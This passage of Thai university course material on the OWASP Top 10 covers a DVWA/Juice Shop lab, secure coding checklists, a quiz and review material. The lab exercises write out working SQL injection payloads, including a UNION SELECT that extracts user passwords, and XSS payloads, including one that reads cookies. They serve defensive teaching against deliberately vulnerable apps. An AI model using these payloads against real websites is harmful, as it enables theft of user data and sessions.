║  Hard-coded password            →  A02: Misconfiguration          ║
║  MD5 สำหรับ password             →  A04: Cryptographic Failures    ║
║  ไม่มี session timeout          →  A07: Auth Failures             ║
║  .env commit ไป GitHub          →  A02: Misconfiguration          ║
║  npm install without audit      →  A08: Vulnerable Components     ║
║  try-catch แล้ว ignore          →  A10: Exceptional Conditions    ║
║  ไม่มี access check             →  A01: Broken Access Control     ║
║  ใช้ HTTP แทน HTTPS              →  A04: Cryptographic Failures    ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝
```

---

## 🔬 Part 6: Lab 3 - Web Vulnerability Demo

### 6.1 ภาพรวม Lab

```
┌─────────────────────────────────────────────────────────────────────┐
│  🧪 Lab 3: Web Security Exercise                                    │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  🎯 วัตถุประสงค์:                                                    │
│     • ทดลองทำ SQL Injection และ XSS ในสภาพแวดล้อมที่ปลอดภัย          │
│     • เข้าใจผลกระทบของช่องโหว่                                        │
│     • เรียนรู้วิธีป้องกัน                                              │
│                                                                     │
│  🛠️ เครื่องมือ:                                                       │
│     • DVWA (Damn Vulnerable Web Application)                       │
│     • หรือ OWASP Juice Shop                                        │
│     • รันใน Docker Container                                        │
│                                                                     │
│  ⏱️ เวลา: 45-60 นาที                                                 │
│                                                                     │
│  ⚠️ WARNING: ทำเฉพาะใน Lab Environment เท่านั้น!                     │
│             การโจมตีระบบจริงโดยไม่ได้รับอนุญาตเป็นสิ่งผิดกฎหมาย         │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

### 6.2 Setup DVWA ด้วย Docker

```bash
# ติดตั้ง DVWA ด้วย Docker
docker run -d -p 80:80 vulnerables/web-dvwa

# หรือ OWASP Juice Shop
docker run -d -p 3000:3000 bkimminich/juice-shop

# เข้าใช้งาน
# DVWA: http://localhost
# Juice Shop: http://localhost:3000
```

**DVWA Default Credentials:**
- Username: `admin`
- Password: `password`

### 6.3 แบบฝึกหัด Lab

#### Exercise 1: SQL Injection (Low Security)

```
┌─────────────────────────────────────────────────────────────────────┐
│  📝 Exercise 1: SQL Injection                                       │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  🎯 เป้าหมาย: ดึงข้อมูล User ทั้งหมดจาก Database                       │
│                                                                     │
│  📍 Location: DVWA > SQL Injection                                  │
│                                                                     │
│  🔧 ขั้นตอน:                                                         │
│  1. ตั้ง Security Level เป็น "Low"                                  │
│  2. ลองใส่ ID ปกติ เช่น 1                                           │
│  3. สังเกตผลลัพธ์                                                    │
│  4. ลองใส่ ' OR '1'='1                                              │
│  5. สังเกตว่าได้ข้อมูลทั้งหมด                                         │
│                                                                     │
│  📝 Payloads ให้ลอง:                                                 │
│  • 1' OR '1'='1                                                     │
│  • ' UNION SELECT user,password FROM users--                       │
│  • 1' AND 1=1--                                                     │
│                                                                     │
│  ❓ คำถาม:                                                           │
│  • ทำไม Payload นี้ถึงทำงาน?                                         │
│  • ข้อมูลอะไรที่ถูกเปิดเผย?                                           │
│  • จะป้องกันอย่างไร?                                                  │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

#### Exercise 2: XSS (Reflected)

```
┌─────────────────────────────────────────────────────────────────────┐
│  📝 Exercise 2: Reflected XSS                                       │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  🎯 เป้าหมาย: แทรก JavaScript ให้ทำงานบน Browser                      │
│                                                                     │
│  📍 Location: DVWA > XSS (Reflected)                                │
│                                                                     │
│  🔧 ขั้นตอน:                                                         │
│  1. ตั้ง Security Level เป็น "Low"                                  │
│  2. ลองพิมพ์ชื่อปกติ                                                  │
│  3. สังเกตว่าชื่อถูกแสดงผลบนหน้าเว็บ                                   │
│  4. ลองใส่ <script>alert('XSS')</script>                            │
│  5. สังเกตว่า Alert box ปรากฏขึ้น                                     │
│                                                                     │
│  📝 Payloads ให้ลอง:                                                 │
│  • <script>alert('XSS')</script>                                    │
│  • <script>alert(document.cookie)</script>                         │
│  • <img src=x onerror="alert('XSS')">                               │
│                                                                     │
│  ❓ คำถาม:                                                           │
│  • Script ทำงานอย่างไร?                                              │
│  • ถ้าเปลี่ยนเป็นขโมย Cookie จะทำอย่างไร?                              │
│  • จะป้องกันอย่างไร?                                                  │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

#### Exercise 3: XSS (Stored)

```
┌─────────────────────────────────────────────────────────────────────┐
│  📝 Exercise 3: Stored XSS                                          │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  🎯 เป้าหมาย: แทรก JavaScript ที่ถูกเก็บใน Database                   │
│                                                                     │
│  📍 Location: DVWA > XSS (Stored)                                   │
│                                                                     │
│  🔧 ขั้นตอน:                                                         │
│  1. ตั้ง Security Level เป็น "Low"                                  │
│  2. สังเกตว่าเป็น Guest Book                                         │
│  3. ลองโพสต์ข้อความปกติ                                               │
│  4. ลองใส่ <script>alert('Stored XSS')</script> ในช่อง Message       │
│  5. Refresh หน้า สังเกตว่า Alert ปรากฏทุกครั้ง                        │
│                                                                     │
│  ⚠️ ความแตกต่างจาก Reflected:                                        │
│  • Stored XSS ทำงานทุกครั้งที่เปิดหน้านี้                              │
│  • ทุกคนที่เข้ามาดูจะถูกโจมตี                                          │
│  • อันตรายกว่ามาก!                                                    │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

### 6.4 Template รายงาน Lab

```markdown
# Lab 3: Web Security Exercise Report

## ข้อมูลนักศึกษา
- ชื่อ-นามสกุล: _______________
- รหัสนักศึกษา: _______________
- วันที่ทำ Lab: _______________

## Exercise 1: SQL Injection

### ผลการทดลอง
1. Payload ที่ใช้: _______________
2. ผลลัพธ์ที่ได้: _______________
3. Screenshot: [แนบรูป]

### วิเคราะห์
1. ทำไม Payload นี้ถึงทำงาน?
   [คำตอบ]

2. ช่องโหว่นี้เกิดจากอะไร?
   [คำตอบ]

3. วิธีป้องกัน:
   [คำตอบ]

## Exercise 2: Reflected XSS
[รูปแบบเดียวกัน]

## Exercise 3: Stored XSS
[รูปแบบเดียวกัน]

## สรุป Secure Coding Guidelines
จากการทำ Lab นี้ สรุปแนวทางการเขียนโค้ดที่ปลอดภัยได้ดังนี้:

1. สำหรับ SQL Injection:
   - _______________
   - _______________

2. สำหรับ XSS:
   - _______________
   - _______________
```

---

## 📊 Part 7: Group Activity - Secure Coding Guidelines

### 7.1 กิจกรรมกลุ่ม

```
┌─────────────────────────────────────────────────────────────────────┐
│  👥 Group Activity: สรุปแนวทาง Secure Coding                         │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  ⏱️ เวลา: 20 นาที                                                    │
│  👥 กลุ่มละ 4-5 คน                                                   │
│                                                                     │
│  📋 ภารกิจ:                                                          │
│  จากประสบการณ์ใน Lab สร้าง "Secure Coding Checklist"                │
│  สำหรับนักศึกษาปี 2 ที่กำลังพัฒนา Web Application                    │
│                                                                     │
│  🎯 ต้องครอบคลุม:                                                    │
│  1. SQL Injection Prevention (อย่างน้อย 3 ข้อ)                      │
│  2. XSS Prevention (อย่างน้อย 3 ข้อ)                                │
│  3. General Best Practices (อย่างน้อย 3 ข้อ)                        │
│                                                                     │
│  📝 Output: Poster/Slide 1 หน้า                                     │
│                                                                     │
│  🏆 นำเสนอ: กลุ่มละ 3 นาที                                           │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

### 7.2 ตัวอย่าง Secure Coding Checklist

```
╔═══════════════════════════════════════════════════════════════════╗
║  ✅ Secure Coding Checklist for Web Applications                   ║
╠═══════════════════════════════════════════════════════════════════╣
║                                                                   ║
║  🗄️ Database Security (SQL Injection Prevention)                  ║
║  ─────────────────────────────────────────────                    ║
║  □ ใช้ Parameterized Queries / Prepared Statements               ║
║  □ ไม่ใช้ String concatenation สำหรับ SQL                         ║
║  □ ใช้ ORM ที่เชื่อถือได้ (Eloquent, SQLAlchemy, Prisma)          ║
║  □ Validate input type ก่อนใช้ใน Query                           ║
║  □ ใช้ Database user ที่มีสิทธิ์จำกัด                               ║
║                                                                   ║
║  🎭 Output Security (XSS Prevention)                               ║
║  ─────────────────────────────────────                             ║
║  □ Encode output ทุกครั้งก่อนแสดงผล                                ║
║  □ ใช้ htmlspecialchars() / htmlentities() (PHP)                 ║
║  □ ใช้ textContent แทน innerHTML (JavaScript)                     ║
║  □ ตั้งค่า Content-Security-Policy header                        ║
║  □ ใช้ HTTPOnly flag สำหรับ Session cookies                      ║
║                                                                   ║
║  🔐 Authentication & Session                                       ║
║  ────────────────────────────                                      ║
║  □ ใช้ bcrypt หรือ Argon2 สำหรับ Password hashing                ║
║  □ Implement session timeout                                      ║
║  □ Regenerate session ID หลัง login                              ║
║  □ ใช้ HTTPS เท่านั้น                                              ║
║                                                                   ║
║  📦 Dependencies                                                   ║
║  ───────────────                                                   ║
║  □ รัน npm audit / pip audit เป็นประจำ                           ║
║  □ Update dependencies อย่างสม่ำเสมอ                              ║
║  □ ใช้ Dependabot หรือ Snyk                                      ║
║                                                                   ║
║  🔧 Configuration                                                  ║
║  ───────────────                                                   ║
║  □ ไม่ commit secrets ไป Git                                      ║
║  □ ใช้ Environment variables                                      ║
║  □ ปิด Debug mode ใน Production                                   ║
║  □ ตั้งค่า Error handling ที่เหมาะสม                                ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝
```

---

## ❓ Part 8: คำถามท้ายบท & Quiz

### 8.1 คำถามทบทวน

```
┌─────────────────────────────────────────────────────────────────────┐
│  ❓ Quiz: OWASP Top 10 Concepts                                     │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  1. OWASP ย่อมาจากอะไร?                                              │
│     a) Open Web Application Security Project                       │
│     b) Open Worldwide Application Security Project ✓               │
│     c) Online Web Application Security Program                     │
│                                                                     │
│  2. ช่องโหว่อันดับ 1 ใน OWASP Top 10:2025 คืออะไร?                   │
│     a) SQL Injection                                                │
│     b) Broken Access Control ✓                                      │
│     c) Cryptographic Failures                                       │
│                                                                     │
│  3. วิธีที่ดีที่สุดในการป้องกัน SQL Injection คือ?                      │
│     a) Blacklist dangerous characters                              │
│     b) Use Parameterized Queries ✓                                 │
│     c) Encrypt all user input                                      │
│                                                                     │
│  4. XSS ประเภทไหนอันตรายที่สุด?                                       │
│     a) Reflected XSS                                                │
│     b) Stored XSS ✓                                                 │
│     c) DOM-based XSS                                                │
│                                                                     │
│  5. HTTPOnly cookie flag ป้องกันอะไร?                                │
│     a) CSRF attacks                                                 │
│     b) JavaScript access to cookie ✓                               │
│     c) Cookie encryption                                            │
│                                                                     │
│  6. หลักการ "Whitelist" validation หมายถึง?                          │
│     a) บล็อกสิ่งที่อันตราย                                            │
│     b) อนุญาตเฉพาะสิ่งที่รู้ว่าปลอดภัย ✓                              │
│     c) เข้ารหัสทุก Input                                             │
│                                                                     │
│  7. Supply Chain Failures หมายถึง?                                  │
│     a) ช่องโหว่ใน Network infrastructure                            │
│     b) ช่องโหว่จาก Third-party dependencies ✓                      │
│     c) ช่องโหว่ใน Physical security                                 │
│                                                                     │
│  8. Content-Security-Policy (CSP) ช่วยป้องกันอะไร?                   │
│     a) SQL Injection                                                │
│     b) XSS ✓                                                        │
│     c) CSRF                                                         │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

### 8.2 คำถามอภิปราย

```
┌─────────────────────────────────────────────────────────────────────┐
│  💬 คำถามสำหรับอภิปราย                                                │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  1. "SQL Injection เป็นช่องโหว่ที่เก่าแก่มาก (20+ ปี)                │
│      ทำไมยังพบได้บ่อยในปัจจุบัน?"                                      │
│                                                                     │
│  2. "Modern frameworks (React, Angular, Vue) ช่วยป้องกัน XSS        │
│      โดย default แล้ว Developer ยังต้องระวังอะไรอีก?"                 │
│                                                                     │
│  3. "ถ้าคุณเป็น Tech Lead จะทำอย่างไรให้ทีมพัฒนา                       │
│      ตระหนักถึงความสำคัญของ Secure Coding?"                          │
│                                                                     │
│  4. "Supply Chain Attack (เช่น Log4Shell, SolarWinds)              │
│      ส่งผลกระทบอย่างไรต่อวงการ IT Security?"                          │
│                                                                     │
│  5. "Balance ระหว่าง Security กับ Usability                         │
│      ควรจัดการอย่างไร?"                                               │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 📝 Part 9: สรุปการเรียนรู้

### 9.1 Key Takeaways

```
╔═══════════════════════════════════════════════════════════════════╗
║                    🎯 Key Takeaways - Week 7                       ║
╠═══════════════════════════════════════════════════════════════════╣
║                                                                   ║
║  1️⃣ OWASP Top 10 คือมาตรฐานที่ต้องรู้                               ║
║     → ใช้เป็น Baseline ในการพัฒนาซอฟต์แวร์ปลอดภัย                   ║
║                                                                   ║
║  2️⃣ Injection ยังเป็นภัยคุกคามสำคัญ                                 ║
║     → ใช้ Parameterized Query ทุกครั้ง!                            ║
║                                                                   ║
║  3️⃣ XSS ป้องกันได้ด้วย Output Encoding                             ║
║     → htmlspecialchars(), textContent, CSP                       ║
║                                                                   ║
║  4️⃣ Input Validation ใช้ Whitelist                                 ║
║     → ปลอดภัยกว่า Blacklist                                        ║
║                                                                   ║
║  5️⃣ Security ต้องคิดตั้งแต่ Design                                  ║
║     → Secure by Design, not by Patch                             ║
║                                                                   ║
║  6️⃣ Supply Chain Security สำคัญมากขึ้น                             ║
║     → ตรวจสอบ Dependencies เป็นประจำ                               ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝
```

### 9.2 Infographic สรุป

```
┌─────────────────────────────────────────────────────────────────────┐
│                                                                     │
│                 🛡️ WEB APPLICATION SECURITY                         │
│                                                                     │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │                                                             │   │
│  │    💉 SQL Injection           🎭 XSS                        │   │
│  │    ──────────────            ─────                          │   │
│  │    Problem:                  Problem:                       │   │
│  │    User input ใน SQL         User input ใน HTML             │   │
│  │                                                             │   │
│  │    Solution:                 Solution:                      │   │
│  │    ✅ Prepared Statements    ✅ Output Encoding             │   │
│  │    ✅ ORM                    ✅ CSP Headers                 │   │
│  │    ✅ Input Validation       ✅ HTTPOnly Cookies            │   │
│  │                                                             │   │
│  └─────────────────────────────────────────────────────────────┘   │
│                                                                     │
│              ┌───────────────────────────────┐                     │
│              │                               │                     │
│              │    🏆 OWASP Top 10:2025       │                     │
│              │                               │                     │
│              │  #1 Access Control            │                     │
│              │  #2 Misconfiguration          │                     │
│              │  #3 Supply Chain 🆕           │                     │
│              │  #4 Cryptographic             │                     │
│              │  #5 Injection ← วันนี้         │                     │
│              │                               │                     │
│              └───────────────────────────────┘                     │
│                                                                     │
│   ╔════════════════════════════════════════════════════════════╗   │
│   ║                                                            ║   │
│   ║   💡 Remember: "Never Trust User Input"                    ║   │
│   ║                                                            ║   │
│   ╚════════════════════════════════════════════════════════════╝   │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 📅 Part 10: Preview สัปดาห์หน้า

### Week 8: Midterm Examination

```
┌─────────────────────────────────────────────────────────────────────┐
│  📚 Week 8: Midterm Examination                                     │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  📝 รูปแบบข้อสอบ:                                                    │
│  • ปรนัย + อัตนัย                                                    │
│  • ครอบคลุม Week 1-7                                                │
│                                                                     │
│  📊 เนื้อหาที่ต้องทบทวน:                                              │
│                                                                     │
│  Week 1: CIA Triad, Asset-Threat-Vulnerability                     │
│  Week 2: Malware Types, Social Engineering                         │
│  Week 3: CVE/CVSS, Risk Assessment                                 │
│  Week 4: OS Security, AAA Framework, Hardening                     │
│  Week 5: Network Security, Firewall, IDS/IPS                       │
│  Week 6: Cryptography, Symmetric vs Asymmetric                     │
│  Week 7: OWASP Top 10, SQLi, XSS, Secure Coding ← วันนี้            │
│                                                                     │
│  💡 Tips:                                                           │
│  • ทบทวน Case Studies ที่เรียนมา                                    │
│  • เข้าใจ Concept มากกว่าท่องจำ                                     │
│  • ฝึกเขียนอธิบายการป้องกันช่องโหว่                                   │
│                                                                     │
│  📅 Review Session: จะมีในสัปดาห์หน้าก่อนสอบ                         │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

### Connection Map: Week 1-7 → Midterm

```
                      ┌─────────────────────────────┐
                      │     🎯 MIDTERM EXAM         │
                      │       (Week 8)              │
                      └──────────────┬──────────────┘
                                     │
       ┌─────────────────────────────┼─────────────────────────────┐
       │                             │                             │
       ▼                             ▼                             ▼
┌──────────────┐           ┌──────────────┐           ┌──────────────┐
│  Foundation  │           │   Defense    │           │  Application │
│  (Week 1-3)  │           │  (Week 4-6)  │           │   (Week 7)   │
├──────────────┤           ├──────────────┤           ├──────────────┤
│• CIA Triad   │           │• OS Security │           │• OWASP Top 10│
│• Threats     │           │• Network Sec │           │• SQLi / XSS  │
│• CVE/CVSS    │           │• Cryptography│           │• Secure Code │
│• Risk        │           │• Hardening   │           │• Input Valid │
└──────────────┘           └──────────────┘           └──────────────┘
       │                             │                             │
       └─────────────────────────────┴─────────────────────────────┘
                                     │
                                     ▼
                      ┌─────────────────────────────┐
                      │   CLO1, CLO2, CLO3 Focus    │
                      └─────────────────────────────┘
```

---

## 📚 แหล่งเรียนรู้เพิ่มเติม

### Official Resources
- 🌐 OWASP Top 10: https://owasp.org/Top10/
- 📖 OWASP Cheat Sheets: https://cheatsheetseries.owasp.org/
- 🧪 OWASP Juice Shop: https://owasp.org/www-project-juice-shop/
- 🔧 DVWA: https://github.com/digininja/DVWA

### Learning Platforms
- 🎮 PortSwigger Web Security Academy: https://portswigger.net/web-security
- 🏆 HackTheBox: https://www.hackthebox.com/
- 🎯 TryHackMe: https://tryhackme.com/

### Tools
- 🔍 Burp Suite Community: https://portswigger.net/burp
- 🦊 OWASP ZAP: https://www.zaproxy.org/
- 🐍 sqlmap (SQLi automation): https://sqlmap.org/

---

## 🏆 Assessment Summary

| รายการ | คะแนน | รายละเอียด |
|--------|-------|------------|
| Lab 3 Report | 10 | Web Security Exercise Report |
| Quiz Week 7 | 10 | OWASP Top 10 Concepts |
| Participation | 5 | Group Activity & Discussion |
| **รวม** | **25** | |

---

**หมายเหตุ:**
- เอกสารนี้สร้างขึ้นสำหรับ ENGSE214 ภาคเรียนที่ 2/2567
- อัปเดตล่าสุด: กุมภาพันธ์ 2026
- ผู้สอน: [ชื่ออาจารย์]

---

*"Security is not a product, but a process." - Bruce Schneier*
